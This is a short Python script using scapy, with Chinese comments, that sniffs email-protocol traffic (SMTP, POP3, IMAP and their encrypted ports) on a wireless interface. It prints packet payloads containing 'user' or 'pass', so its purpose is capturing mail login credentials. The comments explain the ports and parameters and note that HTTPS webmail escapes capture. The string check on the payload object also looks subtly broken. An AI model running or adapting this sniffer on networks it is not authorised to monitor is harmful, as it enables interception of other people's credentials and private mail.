from scapy.all import sniff





def callback_packet(packet):

    print(packet.show())
    if packet.payload:
        mypayload = packet.payload

        if 'user' in mypayload.lower() or 'pass' in mypayload.lower():
            print(f"{mypayload}")


# 常用邮件协议： SMTP-25 POP3-110 IMAP-143 SMTPS-465 POP3S-995 IMAPS-993
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp port 465 or tcp port 995 or tcp port 993", iface="wlan0", prn=callback_packet, count=5, store=0)
# count=5 读5个包  
# store=0 数据包不会保存在内存中
# prn 回调函数，并会将数据包作为参数传递给回调函数


# 注意： web邮箱使用https，所以如上的协议是抓不到web邮箱的 
